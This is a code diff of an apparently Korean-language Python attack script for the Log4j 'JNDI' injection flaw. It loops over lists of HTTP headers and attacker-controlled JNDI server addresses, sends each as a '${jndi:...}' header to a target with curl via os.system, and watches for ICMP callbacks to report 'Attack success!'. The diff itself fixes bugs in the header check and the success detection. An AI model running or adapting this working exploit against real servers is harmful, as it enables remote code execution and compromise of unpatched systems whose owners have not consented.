@@ -82,21 +82,21 @@ def main():
 
     print('[+] 공격 시작')
     
-    if (headers[hname] == 'ALL') and (servers[sname] != 'ALL'):
+    if (headers[hname].replace("\n", "") == 'ALL') and (servers[sname] != 'ALL'):
         for x in range(1, len(headers)):
             attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x]).replace("\n", "")+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
             print('\n'+attcurl)
             os.system(attcurl)
             time.sleep(0.5)
 
-    elif (headers[hname] != 'ALL') and (servers[sname] == 'ALL'):
+    elif (headers[hname].replace("\n", "") != 'ALL') and (servers[sname] == 'ALL'):
         for y in range(1, len(servers)):
             attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname]).replace("\n", "")+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
             print('\n'+attcurl)
             os.system(attcurl)
             time.sleep(0.5)
 
-    elif (headers[hname] == 'ALL') and (servers[sname] == 'ALL'):
+    elif (headers[hname].replace("\n", "") == 'ALL') and (servers[sname] == 'ALL'):
         for x in range(1, len(headers)):
             for y in range(1, len(servers)):
                 attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x]).replace("\n", "")+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
@@ -112,13 +112,12 @@ def sn(pkt) :
     global tip
     global exip
     if pkt.haslayer(ICMP):
+        if socket.gethostbyname(socket.gethostname())==pkt[IP].dst:
+            print(str("[")+str(time)+str("]")+"  "+"ICMP-OUT:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version) +"    "*1+" SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))
+            if (str(pkt[IP].src) == tip):
+                print('Attack success!')
         if socket.gethostbyname(socket.gethostname())==pkt[IP].src:
-            #print(str("[")+str(time)+str("]")+"  "+"ICMP-OUT:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version) +"    "*1+" SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))
-            if (str(pkt[IP].src) == 'tip') & (str(pkt[IP].dst) == str(exip)):
-                print('ok')
-        #if socket.gethostbyname(socket.gethostname())==pkt[IP].dst:
-            #print(str("[")+str(time)+str("]")+"  "+"ICMP-IN:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version)+"    "*1+"    SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst)) 
-
+            print(str("[")+str(time)+str("]")+"  "+"ICMP-IN:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version)+"    "*1+"    SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))
 
 def sp():
     sniff(prn=sn)
